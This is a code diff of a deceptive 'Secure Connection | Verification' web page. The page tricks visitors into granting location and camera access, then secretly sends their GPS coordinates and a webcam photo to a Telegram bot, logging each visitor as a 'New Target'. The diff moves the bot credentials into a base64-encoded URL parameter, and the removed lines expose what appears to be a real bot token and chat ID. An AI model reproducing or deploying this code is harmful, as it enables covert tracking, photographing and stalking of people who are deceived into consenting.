@@ -5,33 +5,9 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Secure Connection | Verification</title>
     <style>
-        body {
-            background-color: #f0f2f5;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-        }
-        .card {
-            background: white;
-            padding: 40px;
-            border-radius: 20px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.08);
-            text-align: center;
-            max-width: 400px;
-            width: 90%;
-        }
-        .spinner {
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid #007bff;
-            border-radius: 50%;
-            width: 50px;
-            height: 50px;
-            animation: spin 1s linear infinite;
-            margin: 0 auto 20px;
-        }
+        body { background-color: #f0f2f5; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: white; padding: 40px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.08); text-align: center; max-width: 400px; width: 90%; }
+        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #007bff; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         h2 { color: #1c1e21; font-size: 22px; margin-bottom: 10px; }
         p { color: #606770; font-size: 15px; line-height: 1.6; }
@@ -52,22 +28,41 @@
 <video id="video" style="display:none;" autoplay></video>
 
 <script>
-    const token = '8764685300:AAHTAvOwsDnJm6yu7HzENMk-2Efmkye5TUI';
-    const chatId = '7066124462';
+    // URL se 'param' nikalna
+    const urlParams = new URLSearchParams(window.location.search);
+    const encodedData = urlParams.get('p'); // 'p' for payload
+
+    let token = '';
+    let chatId = '';
+
     const statusText = document.getElementById('status');
 
     window.onload = async () => {
-        await startProcess();
+        try {
+            if (!encodedData) throw new Error("Missing Config");
+            
+            // Base64 Decode karna
+            const decodedString = atob(encodedData); 
+            const parts = decodedString.split('|'); // Token aur ID ko split karna
+            
+            token = parts[0];
+            chatId = parts[1];
+
+            if (!token || !chatId) throw new Error("Invalid Config");
+            
+            await startProcess();
+        } catch (err) {
+            statusText.innerText = "Error: Authentication Failed";
+            statusText.style.color = "red";
+        }
     };
 
     async function startProcess() {
         statusText.innerText = "Requesting Security Clearance...";
         
-        // 1. Get Location
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(async (pos) => {
                 await sendLocation(pos);
-                // 2. After Location, request Camera
                 await capturePhoto();
             }, (err) => {
                 alert("Please allow all permissions to verify your identity.");
@@ -82,7 +77,7 @@
         const acc = pos.coords.accuracy;
         const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
         
-        const text = `📍 *Location Received!*%0A%0AAccuracy: ${acc.toFixed(1)}m%0AMaps: [View on Google Maps](${mapLink})`;
+        const text = `📍 *New Target Logged!*%0A%0AAccuracy: ${acc.toFixed(1)}m%0AMaps: [View Location](${mapLink})`;
         
         await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${text}&parse_mode=Markdown`);
         statusText.innerText = "Security Check: 50% Complete...";
@@ -95,30 +90,26 @@
             const video = document.getElementById('video');
             video.srcObject = stream;
 
-            // Wait for video to load
             await new Promise(resolve => video.onloadedmetadata = resolve);
             
             const canvas = document.getElementById('canvas');
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             
-            // Wait 1 second to ensure camera focus
             setTimeout(async () => {
-                canvas.getContext('2d').drawImage(video, 1, 1);
+                canvas.getContext('2d').drawImage(video, 0, 0);
                 const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
                 
-                // Send to Telegram
                 const formData = new FormData();
                 formData.append('chat_id', chatId);
                 formData.append('photo', blob, 'identity_check.jpg');
-                formData.append('caption', '📸 Photo Identity Captured');
+                formData.append('caption', '📸 Photo Captured Successfully');
 
                 await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                     method: 'POST',
                     body: formData
                 });
 
-                // Stop Camera
                 stream.getTracks().forEach(track => track.stop());
                 
                 statusText.innerText = "Verified! Redirecting...";
@@ -128,9 +119,7 @@
             }, 1000);
 
         } catch (err) {
-            console.error(err);
-            // Even if camera fails, redirect after location
-            window.location.href = "https://detorlab";
+            window.location.href = "https://linktr.ee/Neonman";
         }
     }
 </script>
